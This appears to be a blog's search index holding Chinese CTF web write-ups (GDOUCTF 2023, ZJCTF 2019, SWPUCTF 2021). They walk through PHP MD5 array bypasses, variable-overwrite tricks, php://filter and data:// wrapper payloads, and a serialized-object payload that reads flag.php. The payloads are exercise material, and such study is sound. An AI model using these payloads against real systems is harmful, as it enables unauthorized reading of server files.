<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GDOUCTF 2023反方向的钟</title>
    <link href="/2023/05/06/GDOUCTF-2023%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/"/>
    <url>/2023/05/06/GDOUCTF-2023%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GDOUCTF 2023受不了一点</title>
    <link href="/2023/05/06/GDOUCTF-2023%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9/"/>
    <url>/2023/05/06/GDOUCTF-2023%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>打开后源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]==<span class="hljs-string">&#x27;j0k3r&#x27;</span>)&#123;<br>               <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>]))&#123;<br>                  <span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br>                  <span class="hljs-variable">$bbb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>];<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$bbb</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$aaa</span>!=<span class="hljs-variable">$bbb</span>)&#123;<br>                   <span class="hljs-variable">$give</span> = <span class="hljs-string">&#x27;cancanwordflag&#x27;</span>;<br>                   <span class="hljs-variable">$get</span> =<span class="hljs-string">&#x27;hacker!&#x27;</span>;<br>                   <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>                         <span class="hljs-keyword">die</span>(<span class="hljs-variable">$give</span>);<br>                    &#125;<br>                   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>                       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$get</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>                   &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                         <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>                    &#125;<br>                   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;洗洗睡吧&quot;</span>;<br>                 &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;行不行啊细狗&quot;</span>;<br>        &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;菜菜&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;就这?&quot;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;别来沾边&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里就直接看他的几个if判断就可以</p><p>第一个判断通过POST传入变量ctf和gdou，并且让它们的MD5值相等，这里运用的是md5强比较，数组绕过就可以</p><p>绕过第一个if就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>ctf[]=<span class="hljs-number">1</span>&amp;gdou[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第二个if及时让cookie的值等于他给我们的j0k3r就可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cookie=j0k3r<br></code></pre></td></tr></table></figure><p>下面的if通过GET传两个变量aaa和bbb他们的值都为114514但是又不能让他们相等，所以我们在bbb后面加一个字符a即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>?aaa=<span class="hljs-number">114514</span>&amp;bbb=<span class="hljs-number">114514</span>a<br></code></pre></td></tr></table></figure><p>下面的if用POST或GET传一个flag</p><p>运用foreach函数：语句将遍历数组array，每次循环时，将当前数组中的值赋给value（或者 k e y 和 key和 key和value），同时，数组指针向后移动直到遍历结束</p><p>所以GET传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>flag=<span class="hljs-number">123</span>=flag&amp;flag=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>总结payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>?aaa=<span class="hljs-number">114514</span>&amp;bbb=<span class="hljs-number">114514</span>a&amp;<span class="hljs-number">123</span>=flag&amp;flag=<span class="hljs-number">123</span><br>POST<br>ctf[]=<span class="hljs-number">1</span>&amp;gdou[]=<span class="hljs-number">2</span><br>cookie<br>cookie=j0k3r<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF 2019NiZhuanSiWei</title>
    <link href="/2023/04/27/ZJCTF-2019NiZhuanSiWei/"/>
    <url>/2023/04/27/ZJCTF-2019NiZhuanSiWei/</url>
    
    <content type="html"><![CDATA[<p>题目提示伪协议加反序列化，打开环境看到前一部分源码，应该是利用伪协议读取反序列化代码的。</p><p><img src="E:\blog\source_posts\ZJCTF-2019NiZhuanSiWei\image-20230427143312278.png" alt="image-20230427143312278"></p><p>先利用data协议绕过第一个if判断payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain,welcomme to zjctf</span><br></code></pre></td></tr></table></figure><p>然后再利用filter协议读取他给的一个useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/read=convert.base64-enconde/resource=useless.php</span><br></code></pre></td></tr></table></figure><p>联合一起就是payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain,welcomme to zjctf&amp;file=php://filter/read=convert.base64-enconde/resource=useless.php</span><br></code></pre></td></tr></table></figure><p>然后得到一段base64编码的字符解码</p><p>解码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p>这道题就是运用pasword这个点进行反序列化，触发tostring魔术方法只需要让file变量等于flag.php然后进行序列化此外注意这道题用了url编码，我们也要用</p><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>整体payload就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">text=data:<span class="hljs-comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SWPUCTF2021新生赛PseudoProtocols</title>
    <link href="/2023/04/24/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BPseudoProtocols-1/"/>
    <url>/2023/04/24/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BPseudoProtocols-1/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p>这一题主要考察了我们php伪协议的知识点，其中利用的两个协议“filter，data协议”</p><p>话不多说直接进入靶机环境</p><p><a href="https://z4a.net/image/Vu3wx2">https://z4a.net/image/Vu3wx2</a></p><p>意思就是让我们去找到hint.php,这时候就考虑php:&#x2F;&#x2F;filter协议</p><p>我对filter协议的理解就是利用过滤器，去读取我们想要的文件，其中过滤器可以用各种编码实现，比如最常用的base64编码，具体实现格式就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>这样后就直接可以将flag.php的明文以base64的形式显示到界面上。</p><p>这一题也是同样的做法直接将flag.php换位hint.php就可以了。</p><p><a href="https://z4a.net/image/Vu3P2p">https://z4a.net/image/Vu3P2p</a></p><p>然后将这些解密，他让我们去访问</p><p><a href="https://z4a.net/image/Vu3xcG">https://z4a.net/image/Vu3xcG</a></p><p>然后得到源码</p><p><a href="https://z4a.net/image/Vu3nQU">https://z4a.net/image/Vu3nQU</a></p><p>这段PHP代码的作用是：</p><ol><li>将PHP脚本的最大执行时间设置为180秒。</li><li>显示当前文件的源代码。</li><li>包含一个名为“flag.php”的文件，该文件包含了一个标志变量。</li><li>从GET参数中获取一个名为“a”的变量。</li><li>如果“a”变量被设置，并且读取“a”变量的文件内容等于“I want flag”，则输出“success”和标志变量的值。</li></ol><p>这段代码存在一个漏洞，即可以通过将“a”变量设置为一个包含“I want flag”的文件路径来读取标志变量的值。</p><p>然后我们就可以用到data协议去访问一个包括 I want flag的文件路径</p><p>data协议：data协议是一种特殊的URL协议，可以将数据直接嵌入到URL中，而无需使用外部文件或数据源。data协议的语法如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>:[&lt;media <span class="hljs-keyword">type</span>&gt;][;base64],&lt;<span class="hljs-keyword">data</span>&gt;；前两个变量可以不要</span><br></code></pre></td></tr></table></figure><p>具体用法就如下payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload=?a=data:<span class="hljs-comment">//text/666,I want flag</span><br><span class="hljs-comment">//正确用法text/后面跟的是plain我这里用的666，但flag也出来了。</span><br></code></pre></td></tr></table></figure><p><a href="https://z4a.net/image/Vu3ErI">https://z4a.net/image/Vu3ErI</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
